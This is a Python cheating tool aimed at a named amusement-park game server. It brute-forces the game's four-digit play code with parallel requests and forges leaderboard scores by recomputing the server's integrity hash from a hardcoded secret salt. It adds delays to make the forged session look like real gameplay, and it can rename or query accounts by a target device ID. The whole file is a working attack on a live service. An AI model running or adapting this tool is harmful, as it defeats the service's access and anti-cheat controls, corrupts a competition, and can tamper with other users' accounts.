#!/usr/bin/python3

from sys import exit
import argparse
import requests as rq
import json
import datetime
from time import sleep
import threading
import hashlib

import udid

url_register = "https://helixgame.liseberg.se/register"
url_sessionscores = "https://helixgame.liseberg.se/sessionscores"
url_name = "https://helixgame.liseberg.se/name"
url_checkcode = "https://helixgame.liseberg.se/checkgamecode"
url_time = "https://helixgame.liseberg.se/time"
url_token = "https://helixgame.liseberg.se/requesttoken"
url_save = "https://helixgame.liseberg.se/savescore"

done = False
code = 0

def set_score(udid, score):
    print("Simulating regular game session...")
    print("Fetching name")
    name = get_name(udid)
    sleep(5)
    print("Fetching server time")
    time = get_time()
    sleep(10)
    print("Fetching token")
    token = get_token(udid)
    print("Waiting to simulate gameplay...")
    sleep(80)
    print("Saving score")
    save_score(udid, token, score=score)

# Register a new user or update an old one
def register(udid, new_name="noob"):
    data = {
        'udid' : udid,
        'name' : new_name
    }
    res = rq.post(url_register, data=data)
    js = json.loads(res.text)

    try:
        if js['data']['message'] == "New user registered":
            print("Successfully registered user " + js['data']['name'])
        elif js['data']['message'] == "User updated":
            print("User successfully updated")
    except:
        print("Could not register user!")
        exit(1)

# Get corresponding username from a udid
def get_name(udid):
    data = {
        'udid' : udid
    }
    res = rq.post(url_name, data=data)
    js = json.loads(res.text)
    try:
        name = js['data']['name']
        print("Username for specified udid is " + str(name))
        return name
    except:
        print("Invalid udid!")
        exit(1)

# Bruteforcing current code for playing the game
def crack_code():
    print("Bruteforcing game code...")
    threads = []
    for i in range(6):
        for j in range(6):
            thread = threading.Thread(target=crack, args=[i*1000+j*100])
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()
    print("The current code is: " + str(code))

# Bruteforce current code
def crack(start):
    global done, code
    data = { 'udid' : udid }
    for i in range(6):
        for j in range(6):
            if done:
                break
            data['code'] = "%04d" % (start+i*10+j)
            res = rq.post(url_checkcode, data=data)
            js = json.loads(res.text)
            if js['data'] != "invalid":
                done = True
                code = data['code']

# Get current server time
def get_time():
    res = rq.get(url_time)
    js = json.loads(res.text)
    try:
        time = js['data']['time']
        return time
    except:
        print("An unexpected error has occurred!")
        exit(1)

# Get a game token
def get_token(udid):
    global token
    data = {
        'udid' : udid
    }
    res = rq.post(url_token, data=data)
    js = json.loads(res.text)
    try:
        token = js['data']['token']
        print("Game token received: " + token)
        return token
    except:
        print("Invalid udid!")
        exit(1)

# Save a score
def save_score(udid, token, score=1):
    state = calculate_hash(udid, score, token)
    session = calculate_session()
    data = {
        'udid' : udid,
        'score' : score,
        'session' : session,
        'state' : state,
        'version' : '2.0'
    }
    res = rq.post(url_save, data=data)
    js = json.loads(res.text)
    try:
        if js['data'] == "Success":
            print("Score saved successfully!")
            return 0
        else:
            print("Warning! The score was not saved successfully!")
            return 1
    except:
        print("An error occurred while saving the score!")
        return 1

# Calculate "state" hash
def calculate_hash(udid, score, token):
    string = udid + str(score) + token + "$1$_laZbmbx"
    hash = hashlib.md5(string.encode("utf-8"))
    state = hash.hexdigest()
    print("State hash: " + state)
    return state

# Calculate session ID
def calculate_session():
    sync_start_time = datetime.datetime.now().timestamp()
    server_time = get_time()/1000.0
    sync_end_time = datetime.datetime.now().timestamp()
    sync_delay = sync_end_time - sync_start_time
    time_offset = (server_time - sync_end_time) + sync_delay/2.0;
    phase_id = int(datetime.datetime.now().timestamp() + time_offset)
    phase_cycle_id = int(phase_id / 105)
    current_competition_id = int(phase_cycle_id / 9)
    return current_competition_id

def main():
    global udid
    parser = argparse.ArgumentParser(description="Win at Helix!")
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument('-r', '--register', '--rename', type=str, dest="username", help='Register a new user or change the username of an existing user')
    mode.add_argument('-c', '--code', action='store_true', help='Crack and display the current game code')
    mode.add_argument('-n', '--name', action='store_true', help='Retrieve the username for a specified ID')
    mode.add_argument('-s', '--score', type=int, help='Desired score')
    parser.add_argument('-u', '--udid', default=udid.udid, help='Target ID. Defaults to udid specified in udid.py')

    args = parser.parse_args()
    udid = args.udid

    if args.username:
        register(udid, args.username)
    elif args.code:
        crack_code()
    elif args.name:
        get_name(udid)
    else:
        set_score(udid, args.score)

    exit(0)

if __name__ == '__main__':
    main()
